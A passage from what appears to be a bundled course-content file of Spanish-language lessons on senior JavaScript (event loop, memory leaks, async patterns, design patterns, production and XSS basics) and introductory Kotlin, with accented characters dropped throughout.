4.  Si hay error de red, lanza: \`"Error de conexin"\`.

## Seccin 3: Callback Hell Refactor

Convierte este cdigo (ficticio) callback-based a Async/Await:

\`\`\`javascript
// ANTES
getUser(1, (user) => {
    getPosts(user.id, (posts) => {
        getComments(posts[0].id, (comments) => {
            console.log(comments);
        });
    });
});

// DESPUS (Tu respuesta aqu)
\`\`\`

## Criterios de Aprobacin

*   [ ] Correcto uso de \`async/await\` y \`try/catch\`.
*   [ ] Explicacin clara del contexto de \`this\` en Arrows.
*   [ ] Entendimiento slido de Closures.
*   [ ] Manejo correcto de errores asncronos.
`,completed:!1,isProject:!0},{id:"js-senior-event-loop",title:"Event Loop en Profundidad (El Corazn de JS)",level:"senior",content:`# Leccin 24: Event Loop en Profundidad (El Corazn de JS)

## 1. Mitos y Realidades

**Mito:** "JavaScript es lento porque es single-threaded".
**Realidad:** JS delega las tareas pesadas (I/O, Timers) al entorno (Browser/Node) y gestiona la orquestacin de manera extremadamente eficiente mediante el Event Loop.

## 2. La Arquitectura

JS tiene un **Call Stack** (Pila de llamadas) donde ejecuta el cdigo sncrono. Cuando se vaca, entra en juego el Event Loop.

### Componentes Clave:
1.  **Call Stack:** LIFO (Last In, First Out). Tu cdigo sncrono.
2.  **Web APIs (Browser) / C++ APIs (Node):** Donde ocurren \`setTimeout\`, \`fetch\`, DOM events.
3.  **Task Queue (Macrotasks):** \`setTimeout\`, \`setInterval\`, I/O.
4.  **Microtask Queue:** \`Promise.then\`, \`queueMicrotask\`, \`MutationObserver\`.

## 3. Microtasks vs Macrotasks (La gran diferencia)

**El Event Loop tiene preferencia VIP por las Microtasks.**
Despus de cada tarea del Call Stack, el Event Loop revisa la Microtask Queue y la vaca **COMPLETAMENTE** antes de pasar a la siguiente Macrotask o renderizar.

\`\`\`javascript
console.log('1. Start');

setTimeout(() => {
    console.log('2. Timeout (Macrotask)');
}, 0);

Promise.resolve().then(() => {
    console.log('3. Promise (Microtask)');
})
.then(() => {
    console.log('4. Promise encadenada (Microtask)');
});

console.log('5. End');

// Orden Real: 1, 5, 3, 4, 2
\`\`\`
*Si creas un bucle infinito de Microtasks, bloquears el navegador igual que con un \`while(true)\`.*

## 4. Renderizado (Rendering Pipeline)

El navegador intenta renderizar a 60fps (cada 16.6ms).
El renderizado ocurre **despus** de vaciar las Microtasks y **antes** de la siguiente Macrotask (a veces).

\`Call Stack -> Microtasks -> Render -> Macrotask\`

## 5. Pregunta de Entrevista Senior

**Pregunta:** Cmo haras para ejecutar una funcin compleja sin bloquear la UI (Main Thread)?
**Respuesta:** "Chunking" o "Task Splitting". Dividir el trabajo en trozos pequeos y usar \`setTimeout\` (Macrotask) o \`requestIdleCallback\` para ceder el control al navegador entre trozos y permitir que renderice.

\`\`\`javascript
function procesarGigante(datos) {
    if (datos.length === 0) return;
    
    // Procesar primeros 1000
    hacerAlgo(datos.slice(0, 1000));
    
    // Encolar el resto para despus del render
    setTimeout(() => {
        procesarGigante(datos.slice(1000));
    }, 0);
}
\`\`\`
`,completed:!1},{id:"js-senior-gestion-memoria",title:"Gestin de Memoria y Garbage Collection",level:"senior",content:`# Leccin 25: Gestin de Memoria y Garbage Collection

## 1. El Ciclo de Vida de la Memoria

1.  **Allocation:** Reservar memoria (crear variables).
2.  **Usage:** Leer/Escribir data.
3.  **Release:** Liberar memoria cuando ya no se necesita.

En C++ lo haces t (\`malloc\`/\`free\`). En JS es automtico (GC).

## 2. Garbage Collection (Mark & Sweep)

El algoritmo principal de V8 es **Mark & Sweep**.
1.  **Roots:** El GC empieza desde las races (Global Object, Stack actual).
2.  **Mark:** Recorre todas las referencias y marca los objetos "alcanzables" (Reachable).
3.  **Sweep:** Los objetos NO marcados (inalcanzables) son eliminados y la memoria devuelta al SO.

## 3. Memory Leaks (Fugas de Memoria)

Ocurren cuando mantienes una referencia a un objeto que ya no necesitas, impidiendo que el GC lo limpie.

### Causas Comunes:
1.  **Variables Globales Accidentales:**
    \`\`\`javascript
    function leak() {
        cosa = "Gigante"; // Sin let/const, se pega a window.cosa
    }
    \`\`\`
2.  **Closures Olvidados:** retienen el scope padre entero.
3.  **Event Listeners:**
    Si aades un listener a un elemento DOM y luego borras el elemento del DOM pero NO quitas el listener, el elemento sigue en memoria (Detached DOM node).
4.  **Timers:** \`setInterval\` que nunca se limpia.

## 4. WeakMap y WeakSet (Herramientas Senior)

Son estructuras donde las referencias a las llaves son **dbiles**. Si no hay otra referencia al objeto llave, el GC puede eliminarlo de la WeakMap automticamente.

**Caso de Uso:** Asociar metadata a objetos DOM.

\`\`\`javascript
let boton = document.getElementById('btn');
const metaData = new WeakMap();

metaData.set(boton, { clicks: 0 });

// Si 'boton' es eliminado del DOM y mi variable 'boton' se limpia:
boton = null; 

// La entrada en WeakMap desaparece sola. 
// Con un Map normal, se hubiera quedado ah para siempre (Leak).
\`\`\`

## 5. Desafo de Produccin
Ests codeando una SPA (Single Page App). Los usuarios se quejan de que tras 1 hora de uso, la app va lenta y el navegador consume 2GB de RAM.
*   Qu herramienta usas? -> Chrome DevTools > Memory Tab.
*   Qu buscas? -> Heap Snapshot y Allocation Timeline.
*   Qu sospechas? -> Componentes desmontados que no limpiaron sus suscripciones o listeners.
`,completed:!1},{id:"js-senior-arquitectura-async",title:"Arquitectura Asncrona Avanzada",level:"senior",content:`# Leccin 26: Arquitectura Asncrona Avanzada

## 1. Ms all de Async/Await

Async/Await es genial, pero para flujos de datos complejos (streams, sockets, archivos grandes), se queda corto.

## 2. Generadores (\`function*\`)

Funciones que pueden "pausarse" (\`yield\`) y reanudarse.
Son la base de libreras como Redux-Saga.

\`\`\`javascript
function* idGenerator() {
    let id = 1;
    while(true) {
        yield id++; // Pausa y devuelve el valor
    }
}

const gen = idGenerator();
console.log(gen.next().value); // 1
console.log(gen.next().value); // 2
\`\`\`

## 3. Async Iterators (\`for await...of\`)

Combina generadores con promesas. Perfecto para leer streams de datos chunk por chunk.

\`\`\`javascript
async function* fetchDatosPaginados(url) {
    let nextUrl = url;
    while(nextUrl) {
        const response = await fetch(nextUrl);
        const data = await response.json();
        nextUrl = data.nextPage;
        yield data.results; // Emite una pgina de resultados
    }
}

// Uso
async function consumir() {
    for await (const pagina of fetchDatosPaginados('/api/users')) {
        renderizar(pagina); // Renderiza pgina a pgina segn llegan
    }
}
\`\`\`

## 4. Race Conditions (Condiciones de Carrera)

Dos peticiones asncronas compiten. La ltima en llegar debera ganar, pero a veces la primera llega ltima y sobrescribe el estado incorrectamente.

**Solucin Senior:** AbortController.

\`\`\`javascript
let controller;

async function buscar(query) {
    if (controller) controller.abort(); // Cancela la peticin anterior
    controller = new AbortController();

    try {
        const res = await fetch(\`/api?q=\${query}\`, { signal: controller.signal });
        const data = await res.json();
        mostrar(data);
    } catch (err) {
        if (err.name === 'AbortError') console.log('Bsqueda cancelada');
    }
}
\`\`\`

## 5. Patrn Retry con Backoff Exponencial

Si una API falla, no reintentes inmediatamente (DDoS a tu propio server).
Espera 1s, luego 2s, luego 4s...

\`\`\`javascript
async function fetchWithRetry(url, retries = 3, delay = 1000) {
    try {
        return await fetch(url);
    } catch (err) {
        if (retries === 0) throw err;
        await new Promise(r => setTimeout(r, delay));
        return fetchWithRetry(url, retries - 1, delay * 2);
    }
}
\`\`\`
`,completed:!1},{id:"js-senior-patrones-avanzados",title:"Patrones de Diseo Avanzados",level:"senior",content:`# Leccin 27: Patrones de Diseo Avanzados

## 1. Por qu patrones?

Para resolver problemas recurrentes de arquitectura. Un Senior no reinventa la rueda.

## 2. Singleton (Instancia nica)

Asegurar que una clase tenga solo una instancia global (ej. Conexin a DB, Estado Global).

\`\`\`javascript
class Config {
    constructor() {
        if (Config.instance) return Config.instance;
        this.settings = {};
        Config.instance = this;
    }
}
// En mdulos ES6, exportar una instancia const funciona como Singleton automtico.
// export default new Config();
\`\`\`

## 3. Observer / Pub-Sub

Desacoplar componentes. Uno emite eventos, otros escuchan.

\`\`\`javascript
class EventEmitter {
    constructor() {
        this.events = {};
    }
    on(event, listener) {
        if (!this.events[event]) this.events[event] = [];
        this.events[event].push(listener);
    }
    emit(event, data) {
        if (this.events[event]) {
            this.events[event].forEach(fn => fn(data));
        }
    }
}
\`\`\`

## 4. Factory Function (vs Constructores)

Prefiere Factories para evitar problemas con \`this\` y favorecer composicin.

\`\`\`javascript
// Class (Herencia rgida)
class Dog extends Animal { ... }

// Factory (Composicin flexible)
const createDog = () => {
    const dog = { ...createAnimal() };
    return {
        ...dog,
        ...canBark(dog),
        ...canWagTail(dog)
    };
};
\`\`\`

## 5. Module Pattern (Revelador)

La base de todo el JS moderno. Encapsular privado, revelar pblico.

\`\`\`javascript
const BankAccount = (() => {
    let balance = 0; // Privado

    function changeBal(val) { // Privado
        balance += val;
    }

    return {
        deposit: (val) => changeBal(val),
        withdraw: (val) => changeBal(-val),
        value: () => balance
    };
})();
\`\`\`

## 6. Composition over Inheritance

**Mantra Senior.** La herencia (\`extends\`) crea acoplamientos fuertes y frgiles ("Gorilla-Banana Problem": pides una banana y te traes al gorila y a toda la selva).
La composicin construye objetos combinando capacidades pequeas.
`,completed:!1},{id:"js-senior-js-produccion",title:"JavaScript en Produccin",level:"senior",content:`# Leccin 28: JavaScript en Produccin

## 1. El cdigo no termina en localhost

Un Senior piensa en Build, Deploy, Performance y Seguridad.

## 2. Bundling y Tree Shaking

Herramientas (Webpack, Vite, Rollup) empaquetan tu cdigo.
**Tree Shaking:** Eliminacin de cdigo muerto.
Si importas \`import { a } from 'libreria-gigante'\`, solo \`a\` debera ir al bundle final. Esto requiere usar ES Modules (\`import/export\`), no CommonJS.

## 3. Polyfills y Transpilacin (Babel)

Tu cdigo debe correr en iOS 12? En Chrome 50?
*   **Transpilar:** Convertir sintaxis nueva (\`=>\`) a vieja (\`function\`).
*   **Polyfill:** Aadir funcionalidad que no existe (\`Promise\`, \`Array.includes\`).

**Estrategia Senior:** \`<script type="module">\` sirve cdigo moderno a navegadores modernos (90% trfico) y carga menos KB. Usa \`nomodule\` para servir legacy bundle a browsers viejos.

## 4. Seguridad: XSS (Cross Site Scripting)

El ataque #1 en Frontend. Inyectar scripts maliciosos.

**Vulnerable:**
\`div.innerHTML = userInput;\`

**Seguro:**
\`div.innerText = userInput;\`

Si usas React/Vue, ellos escapan por defecto. Pero cuidado con \`dangerouslySetInnerHTML\`.

## 5. Performance Metrics (Web Vitals)

*   **LCP (Largest Contentful Paint):** Carga visual.
*   **FID (First Input Delay):** Interactividad.
*   **CLS (Cumulative Layout Shift):** Estabilidad visual (cosas que saltan).

Un Senior optimiza estas mtricas.

## 6. Error Boundaries y Monitoring

No dejes que tu app explote en blanco. Captura errores globales.
Usa servicios como Sentry o LogRocket para recibir alertas cuando un usuario tiene un crash en produccin.

\`\`\`javascript
window.addEventListener('error', (event) => {
    Sentry.captureException(event.error);
});
\`\`\`
`,completed:!1},{id:"js-senior-errores-criticos",title:"Errores Crticos Reales (Case Studies)",level:"senior",content:`# Leccin 29: Errores Crticos Reales (Case Studies)

## Caso 1: El JSON Infinito

**Problema:** Una app crashea el navegador al intentar guardar el estado.
**Cdigo:** \`JSON.stringify(state)\`
**Causa:** Estructura Circular. El objeto A apunta a B, y B apunta a A. \`JSON.stringify\` entra en bucle infinito.
**Solucin Senior:** Usar un replacer function en stringify o libreras como \`flatted\`.

## Caso 2: El Zombie Listener

**Problema:** SPA de chat. Al navegar entre salas, los mensajes llegan duplicados, luego triplicados.
**Causa:**
\`\`\`javascript
useEffect(() => {
    socket.on('message', handleMessage);
    // Falta el cleanup!
}, []);
\`\`\`
Cada vez que el componente se monta, aade un NUEVO listener sin quitar el viejo.
**Solucin:** Devolver la funcin de limpieza (\`off\` o \`removeListener\`).

## Caso 3: El \`await\` dentro del \`forEach\`

**Problema:** Queremos guardar 5 usuarios en base de datos secuencialmente.
\`\`\`javascript
users.forEach(async (user) => {
    await saveUser(user);
});
console.log('Done');
\`\`\`
**Resultado:** Imprime "Done" INMEDIATAMENTE. Las promesas se disparan pero el forEach no las espera.
**Solucin:** Usar \`for...of\` con await, o \`Promise.all\` con map.

## Caso 4: Mutacin de Props/Estado

**Problema:** Un objeto cambia en un lugar y rompe algo totalmente no relacionado en otra parte de la UI.
**Causa:** Pasar objetos por referencia y mutarlos directamente (\`obj.prop = 1\`), rompiendo el principio de inmutabilidad (especialmente crtico en React/Redux).
**Solucin:** \`const newState = { ...oldState, prop: 1 };\` o \`Immer\`.

## Desafo Final: El Debounce Fallido

Implementa una funcin \`debounce\` robusta.
Si el usuario escribe en un buscador, solo dispara la bsqueda 500ms despus de que deje de escribir.
Si dispara una nueva tecla, cancela el timer anterior.
Esta es la prueba de fuego de closures, timers y this.
`,completed:!1},{id:"js-senior-weaving-metaprogramming",title:"Metaprogramacin: Proxies y Reflection",level:"senior",content:`# Leccin 30: Metaprogramacin: Proxies y Reflection

Un Senior no solo escribe cdigo, crea herramientas que escuchan al propio cdigo.

## 1. Proxies
Un Proxy te permite interceptar y personalizar operaciones fundamentales sobre objetos (lectura, escritura, borrado).

\`\`\`javascript
const target = { mensaje: "Hola" };
const handler = {
    get: (obj, prop) => {
        return prop in obj ? obj[prop] : "Propiedad no existe";
    }
};

const proxy = new Proxy(target, handler);
console.log(proxy.mensaje); // "Hola"
console.log(proxy.loquesea); // "Propiedad no existe"
\`\`\`
*Uso real:* Reactividad en Vue 3, validacin de esquemas, logging automtico.

## 2. Reflect
Es un objeto global que proporciona mtodos para interceptar operaciones de JavaScript de forma limpia, sin usar operadores como \`in\` o \`delete\`.

## 3. Web Workers: Paralelismo Real
JS es single-threaded, pero los Web Workers permiten correr cdigo en hilos de fondo.

\`\`\`javascript
// main.js
const worker = new Worker('worker.js');
worker.postMessage([1000, 2000]); // Enva data pesada

// worker.js
onmessage = (e) => {
    const result = procesarGigante(e.data);
    postMessage(result); // Devuelve resultado
};
\`\`\`

## 4. Ejercicio
Crea un Proxy para un objeto \`Perfil\`. El proxy debe impedir que se asigne una edad menor a 0 o mayor a 120.
`,completed:!1},{id:"js-senior-functional-patterns",title:"Programacin Funcional Avanzada",level:"senior",content:`# Leccin 31: Programacin Funcional Avanzada

A nivel Senior, dejas de pensar en "instrucciones" y empiezas a pensar en "transformaciones de datos".

## 1. Pureza e Inmutabilidad
*   **Funciones Puras:** Mismo input -> Mismo output. Sin efectos secundarios. Son fciles de testear y cachear.
*   **Inmutabilidad:** No cambias el objeto original, creas uno nuevo.

## 2. Currying y Aridad
La Aridad es el nmero de argumentos de una funcin. Currying es convertir una funcin de varios argumentos en una serie de funciones de un solo argumento.

\`\`\`javascript
const suma = a => b => a + b;
const sumar5 = suma(5);
console.log(sumar5(10)); // 15
\`\`\`

## 3. Composicin (Pipe y Compose)
Construir lgica compleja uniendo funciones pequeas.

\`\`\`javascript
const aMayusculas = str => str.toUpperCase();
const exclamar = str => \`\${str}!!\`;
const repetir = str => \`\${str} \${str}\`;

// Sin composicin: repetir(exclamar(aMayusculas("hola")))
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);

const gritarYRepetir = pipe(aMayusculas, exclamar, repetir);
console.log(gritarYRepetir("javascript")); // "JAVASCRIPT!! JAVASCRIPT!!"
\`\`\`

## 4. Higher Order Functions Avanzadas
Conceptos de **Monads** o **Functors** (opcional pero bueno saberlo): envolver un valor en un contexto para operarlo de forma segura.

## 5. Ejercicio
Implementa una funcin \`compose\` (que funcione de derecha a izquierda, al revs que pipe) y sala para encadenar 3 transformaciones de texto.
`,completed:!1},{id:"js-senior-eval",title:"Evaluacin Final: Senior",level:"senior",content:`# Evaluacin Final: JavaScript Senior

Esta evaluacin mide tu capacidad para resolver problemas complejos de arquitectura, performance y diseo de software.

## Seccin 1: Preguntas de Arquitectura (Nivel Experto)

1.  **Explica en detalle cmo funciona el Event Loop:** Cul es la diferencia CRUCIAL entre una Macrotarea (setTimeout) y una Microtarea (Promise) en cuanto a priorizacin y renderizado?
2.  **Describe el proceso de Garbage Collection (Mark-and-Sweep) y menciona 3 formas comunes de causar Memory Leaks en JS moderno.**
3.  **Diseo de APIs:** Cules son las ventajas del patrn Module (Revealing Module) frente a clases tradicionales para la encapsulacin?
4.  **Si una funcin asncrona bloquea el Single Thread por 5 segundos, qu pasa con el usuario?** Cmo resolveras este bloqueo (Task Splitting / Web Workers)?

## Seccin 2: Desafo de Performance - "El Debouncer"

Escribe una funcin \`debounce(fn, wait)\` desde cero.
Esta funcin debe recibir otra funcin (\`fn\`) y un tiempo (\`wait\`) en milisegundos.
Debe devolver una NUEVA funcin que, cuando se ejecute repetidamente (ej: evento \`scroll\` o \`input\`), SOLO llame a \`fn\` UNA VEZ despus de que el usuario deje de interactuar por \`wait\` ms.

**Requisitos:**
1.  Debe usar closures para guardar el temporizador.
2.  Debe usar \`apply\` o \`call\` para preservar el contexto (\`this\`) y los argumentos.
3.  Debe poder cancelar la ejecucin previa si se invoca de nuevo antes del tiempo.

## Seccin 3: Memory Leak Debugging (Terico)

**Escenario:**
Tienes una SPA (Single Page App). Al navegar repetidamente entre la Home y el Dashboard, la memoria RAM usada por la pestaa de Chrome sube de 100MB a 1GB en 10 minutos.

**Pregunta:**
Describe paso a paso cmo usaras Chrome DevTools para identificar la causa raz.
Qu herramienta usas? (Memory Tab, Performance Monitor).
Cmo confirmas si es un componente de React/Vue desmontado que dej basura?

## Criterios de Aprobacin

*   [ ] Explicacin precisa y tcnica del Event Loop (Micro vs Macro).
*   [ ] Implementacin correcta de \`debounce\` manejando \`this\` y argumentos.
*   [ ] Conocimiento profundo de herramientas de perfilado (Profiling).
*   [ ] Solucin arquitectnica para evitar bloqueos del Main Thread.
`,completed:!1,isProject:!0}]},Jx={id:"kotlin",title:"Kotlin Moderno",description:"El lenguaje oficial de Android y el futuro del Backend en la JVM. Conciso, seguro y potente.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"kotlin-01-intro-kotlin",title:"Kotlin - El hijo prdigo de la JVM",level:"junior",content:`# Leccin 01: Kotlin - El hijo prdigo de la JVM

**Kotlin** es lo que Java debi haber sido desde el principio. Es moderno, conciso y 100% interoperable con Java. Google lo declar el lenguaje oficial de Android en 2017.

## 1. Kotlin vs Java
*   **Concisin:** Menos cdigo repetitivo (Boilerplate). No ms \`public static void main\`, ni getter/setters manuales.
*   **Null Safety:** El compilador te obliga a manejar los nulos. Adis \`NullPointerException\`.
*   **Interoperabilidad:** Puedes llamar cdigo Java desde Kotlin y viceversa.

## 2. Variables (\`val\` vs \`var\`)
En Kotlin preferimos la inmutabilidad.
*   \`val\`: Valor inmutable (como \`const\` en JS o \`final\` en Java). **sala por defecto.**
*   \`var\`: Variable mutable.

\`\`\`kotlin
val nombre = "Octavio" // Tipo inferido (String)
var edad = 30
edad = 31 // OK
// nombre = "Pedro" // ERROR de compilacin
\`\`\`

## 3. Tipos de Datos
Kotlin es esttico, pero inteligente (Preferencia de tipos).
\`\`\`kotlin
val numero: Int = 10
val precio: Double = 99.99
val esKotlinGenial: Boolean = true
\`\`\`

---

### Misin Junior:
Acostmbrate a usar \`val\`. Si una variable no necesita cambiar, no debera poder cambiar. Esto elimina toda una categora de bugs.
`,completed:!1},{id:"kotlin-02-funciones-control",title:"Funciones y Control de Flujo (El adis a Java verbose)",level:"junior",content:`# Leccin 02: Funciones y Control de Flujo (El adis a Java verbose)

En Kotlin, las funciones son ciudadanos de primera clase. Y el \`if\` es una expresin.

## 1. Funciones (\`fun\`)
\`\`\`kotlin
fun sumar(a: Int, b: Int): Int {
    return a + b
}

// Forma exprs (Single-expression function, el compilador infiere el tipo)
fun restar(a: Int, b: Int) = a - b
\`\`\`

## 2. Argumentos por defecto y nombrados
\`\`\`kotlin
fun saludar(mensaje: String = "Hola", nombre: String) {
    println("$mensaje $nombre")
}

// Llamada con argumento nombrado
saludar(nombre = "Octavio") // Imprime: Hola Octavio
saludar(mensaje = "Chau", nombre = "Pedro")
\`\`\`

## 3. Control de Flujo
*   \`if\`: Puede devolver un valor.
\`\`\`kotlin
val mayor = if (a > b) a else b // Equivalente al ternario (a > b ? a : b)
\`\`\`

*   \`when\`: El nuevo y poderoso \`switch\`.
\`\`\`kotlin
val x = 1
when (x) {
    1 -> print("Es uno")
    2 -> print("Es dos")
    else -> print("Es otro")
}
\`\`\`

*   \`for\`:
\`\`\`kotlin
for (i in 1..5) println(i) // Rangos (1, 2, 3, 4, 5)
for (i in 10 downTo 0 step 2) println(i)
\`\`\`

---

### Misin Junior:
Kotlin elimina la necesidad de Sobrecarga de Mtodos (Overloading) gracias a los argumentos por defecto. Aprovchalo!
`,completed:!1},{id:"kotlin-03-null-safety",title:"Null Safety - El fin de los NullPointerException",level:"junior",content:'# Leccin 03: Null Safety - El fin de los NullPointerException\n\nLa caracterstica estrella de Kotlin.\n\n## 1. Tipos Nulables (?) vs No-Nulables\n*   `String`: **Nunca** puede ser null.\n*   `String?`: **Puede** ser un String o null.\n\n```kotlin\nvar a: String = "abc"\n// a = null // ERROR de compilacin\n\nvar b: String? = "abc"\nb = null // OK (Pero ahora b es peligroso)\n```\n\n## 2. Acceso Seguro (Safe Call `?.`)\nSi `b` puede ser null, no puedes llamar a `b.length` directamente.\n```kotlin\nprintln(b?.length) // Imprime la longitud si b existe, o "null" si b es null\n```\n\n## 3. Elvis Operator (`?:`)\nDa un valor por defecto si la variable es null.\n```kotlin\nval l = b?.length ?: -1 \n// Si b es null, l ser -1\n```\n\n## 4. Not-null Assertion (`!!`) - Peligro!\nLe dices al compilador "Confa en m, s que esto no es null".\n```kotlin\nval l = b!!.length \n// Si b es null, lanza NullPointerException aqu mismo.\n```\n\n---\n\n### Misin Junior:\nNunca uses `!!` a menos que sea ABSOLUTAMENTE necesario (casi nunca). Usa `?.` y `?:` para escribir cdigo robusto.\n',completed:!1},{id:"kotlin-04-data-classes",title:"Clases y Objetos Modernos",level:"junior",content:'# Leccin 04: Clases y Objetos Modernos\n\nAs son las clases concisas. Menos ruido, ms seal.\n\n## 1. La Clase de una lnea\n```kotlin\nclass Persona(val nombre: String, var edad: Int)\n```\nEsto crea una clase llamada `Persona` con dos propiedades:\n*   `nombre`: `val` (Inmutable, solo getter).\n*   `edad`: `var` (Mutable, getter y setter).\n*   El constructor por defecto.\n\n## 2. Instanciacin (Sin `new`)\n```kotlin\nval p = Persona("Octavio", 30)\nprintln(p.nombre) // Getter automtico\np.edad = 31 // Setter automtico\n```\n\n## 3. Data Classes (Increble para DTOs!)\nTienen `equals()`, `hashCode()`, `toString()` y `copy()` gratis.\n```kotlin\ndata class Usuario(val id: Int, val email: String)\n\nval u1 = Usuario(1, "octavio@example.com")\nval u2 = u1.copy(id = 2) // Crea una copia idntica pero con id = 2\n\nprintln(u1) // Imprime: Usuario(id=1, email=octavio@example.com)\n```\n\n## 4. Herencia\nTodas las clases son `final` por defecto (no se pueden heredar). Si quieres heredar, debes usar `open`.\n```kotlin\nopen class Animal\nclass Perro : Animal()\n```\n\n---\n\n### Misin Junior:\nSi tienes una clase que solo guarda datos, SIEMPRE usa `data class`. Es ms legible y seguro.\n',completed:!1},{id:"kotlin-05-practica-junior",title:"Prctica Kotlin Junior: El Sistema de Anlisis de Texto",level:"junior",content:`# Prctica Kotlin Junior: El Sistema de Anlisis de Texto

Demuestra que entiendes la simplicidad de Kotlin.

---

## 1. El Analizador (Extension Functions)
Crea una clase \`Analizador\`.
*   Crea una funcin de extensin para \`String\` llamada \`contarPalabras()\`:
    *   Divide el string por espacios (\`split(" ")\`).
    *   Cuenta las palabras resultantes.

## 2. El Reportero (Listas y Filtrado)
En el mtodo \`main\`:
1.  Crea una lista de Strings inmutable (\`val frases = listOf("Hola mundo", "Esto es Kotlin")\`).
2.  Itera sobre la lista con un bucle \`for\`.
3.  Imprime solo las frases que tengan ms de 1 palabra.
4.  Usa tu funcin \`contarPalabras()\`.

## 3. Reto de Null Safety
Recibe un string nullable (\`String?\`), si es null, imprime "Texto Vaco" (usando el operador Elvis \`?:\`).

---

### Misin:
Un desarrollador Junior de Kotlin no escribe cdigo Java en Kotlin (\`if (s != null)\`). Escribe cdigo idiomtico (\`s?.let\`).
`,completed:!1,isProject:!0},{id:"kotlin-06-objetos-interfaces",title:"Objetos y Singleton (El adis a `static`)",level:"junior",content:`# Leccin 06: Objetos y Singleton (El adis a \`static\`)

Kotlin no tiene la palabra clave \`static\`. Qu horror! Cmo hacemos constantes? Con \`Object\`.

## 1. Object Declaration (Singleton)
Define una clase y crea una instancia NICA al mismo tiempo.
\`\`\`kotlin
object DatabaseConfig {
    const val URL = "jdbc:mysql://localhost:3306"
    fun connect() { println("Conectando a $URL") }
}

// Uso directo
DatabaseConfig.connect()
\`\`\`

## 2. Companion Object
Si quieres algo "esttico" dentro de una clase normal.
\`\`\`kotlin
class Usuario {
    companion object {
        fun crearAnonimo(): Usuario = Usuario()
    }
}
val u = Usuario.crearAnonimo()
\`\`\`

## 3. Interfaces
Igual que en Java, pero pueden tener implementacin por defecto.
\`\`\`kotlin
interface Volador {
    fun volar() { print("Volando...") } // Default
}

class Pajaro : Volador // No necesita implementar volar()
\`\`\`

---

### Misin Junior:
Si tienes una clase \`Util\` con puros mtodos estticos (como en Java), en Kotlin mejor usa "Top Level Functions" (funciones fuera de cualquier clase, directamente en el archivo). Es ms limpio.
`,completed:!1},{id:"kotlin-07-practica-nullsafety",title:"Prctica Kotlin Junior: Rescatando Nulos",level:"junior",content:'# Prctica Kotlin Junior: Rescatando Nulos\n\nEspera! No tan rpido. Antes de avanzar, demuestra que sabes sobrevivir en el mundo nullable.\n\n## 1. El Formulario de Registro (Data Classes)\nCrea una `data class` llamada `Usuario` con:\n*   `nombre`: String (Obligatorio)\n*   `edad`: Int? (Opcional, puede ser null)\n*   `telefono`: String? (Opcional)\n\n## 2. El Validador (Null Safety)\nEscribe una funcin `validarUsuario(u: Usuario)`:\n1.  Si `edad` es null, imprime "Edad desconocida".\n2.  Si `edad` es menor de 18, imprime "Menor de edad".\n3.  Si `telefono` existe, imprime "Llamando a $telefono". Si no, imprime "Sin telfono". (Usa `let` o `if`).\n\n## 3. Reto: Filtrado Seguro\n*   Crea `val lista: List<Usuario?> = listOf(u1, null, u2, null)`.\n*   Itera e imprime solo los nombres de los usuarios que NO son null. (Tips: `lista.filterNotNull()`).\n\n---\n\n### Misin:\nUn desarrollador Kotlin escribe cdigo que casi nunca lanza `NullPointerException`. Si tu cdigo falla por un null, fallaste como desarrollador Kotlin.\n',completed:!1,isProject:!0},{id:"kotlin-08-colecciones-lambdas",title:"Colecciones y Programacin Funcional",level:"semi-senior",content:`# Leccin 08: Colecciones y Programacin Funcional

Kotlin tiene una API de colecciones envidiable.

## 1. Listas Inmutables vs Mutables
Por defecto, \`listOf\` crea una lista de solo lectura.
\`\`\`kotlin
val numeros = listOf(1, 2, 3)
// numeros.add(4) // ERROR de compilacin

val mutables = mutableListOf(1, 2, 3)
mutables.add(4) // OK
\`\`\`

## 2. Lambdas y Higher-Order Functions
Una funcin puede recibir otra funcin como parmetro.
\`\`\`kotlin
val doble = { x: Int -> x * 2 }
println(doble(5)) // 10

// Pasar lambda como ltimo parmetro (Trailing Lambda)
numeros.filter { it > 2 } // "it" es el nombre por defecto del parmetro nico
\`\`\`

## 3. Operaciones Funcionales
*   \`map\`: Transforma cada elemento.
*   \`filter\`: Selecciona elementos.
*   \`forEach\`: Ejecuta una accin.
*   \`reduce / fold\`: Acumula un resultado.

\`\`\`kotlin
val pares = numeros
    .filter { it % 2 == 0 }
    .map { it * 10 }
// Resultado: [20]
\`\`\`

---

### Misin Semi-Senior:
Aprende a usar \`.asSequence()\` si tienes una lista gigante y vas a encadenar muchos \`map\` y \`filter\`. Evita crear listas intermedias innecesarias.
`,completed:!1},{id:"kotlin-09-extensiones-sealed",title:"Extension Functions y Sealed Classes",level:"semi-senior",content:`# Leccin 09: Extension Functions y Sealed Classes

Dos sper poderes que Java no tiene (o no tena).

## 1. Extension Functions (Magia)
Puedes agregar mtodos a clases que no te pertenecen (ej: \`String\`, \`List\`, incluso \`Activity\` en Android).
\`\`\`kotlin
// Agregamos un mtodo .esEmail() a la clase String
fun String.esEmail(): Boolean {
    return this.contains("@") && this.contains(".")
}

val correo = "test@test.com"
println(correo.esEmail()) // True
\`\`\`
**Nota:** Esto en realidad es un mtodo esttico que recibe el String como primer argumento. Puro azcar sintctico.

## 2. Sealed Classes (Enum con Esteroides)
Una clase sellada restringe la jerarqua de herencia. Todas las subclases deben estar conocidas en tiempo de compilacin (normalmente en el mismo archivo).
\`\`\`kotlin
sealed class EstadoUI {
    object Cargando : EstadoUI()
    data class Exito(val datos: String) : EstadoUI()
    data class Error(val mensaje: String) : EstadoUI()
}

// El compilador te obliga a cubrir TODOS los casos en un 'when'
fun manejarEstado(e: EstadoUI) {
    when (e) {
        is EstadoUI.Cargando -> mostrarSpinner()
        is EstadoUI.Exito -> mostrarDatos(e.datos)
        is EstadoUI.Error -> mostrarError(e.mensaje)
        // No hace falta 'else', los casos son exhaustivos
    }
}
\`\`\`

---

### Misin Semi-Senior:
Las \`Sealed Classes\` son el estndar para manejar estados en UI moderna (MVI/MVVM) en Android.
`,completed:!1},{id:"kotlin-10-concurrencia-corutinas",title:"Excepciones y Concurrencia (Corutinas)",level:"semi-senior",content:`# Leccin 10: Excepciones y Concurrencia (Corutinas)

El manejo de hilos en Java es un dolor de cabeza. Kotlin lo soluciona con **Corrutinas**.

## 1. Excepciones (\`checked\` vs \`unchecked\`)
En Kotlin, **TODAS las excepciones son Unchecked**.
No ests obligado a atraparlas (\`try-catch\`).
\`\`\`kotlin
// Java
// public void f() throws IOException

// Kotlin
// fun f() -> Simplemente corre. Si quieres, la atrapas.
\`\`\`

## 2. Corrutinas (Introduccin)
